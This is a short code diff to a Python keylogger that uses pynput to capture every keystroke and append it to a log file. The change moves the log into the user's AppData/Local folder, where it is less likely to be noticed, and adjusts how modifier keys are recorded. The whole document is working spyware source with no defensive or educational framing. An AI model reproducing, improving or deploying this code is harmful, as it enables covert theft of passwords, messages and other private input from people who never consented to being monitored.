@@ -1,5 +1,7 @@
 from pynput.keyboard import Listener
+import os
 
+chemin = 'C:/Users/'+os.getcwd().split('\\')[2]+'/AppData/Local/'
 
 def write_to_file(key):
        letter = str(key)
@@ -8,17 +10,15 @@ def write_to_file(key):
        if letter == 'Key.space':
               letter = ' '
        if letter == 'Key.alt_l':
-              letter = '<alt>'
+              letter = ''
        if letter == 'Key.alt_r':
-              letter = '<alt>'
+              letter = ''
        if letter == 'Key.shift_r':
               letter = ''
-       if letter == "Key.ctrl_l":
-              letter = "<alt>"
        if letter == "Key.enter":
               letter = "\n"
 
-       with open("log.txt", 'a') as f:
+       with open(chemin+"log.txt", 'a') as f:
               f.write(letter)
 
 # Collecting events until stopped
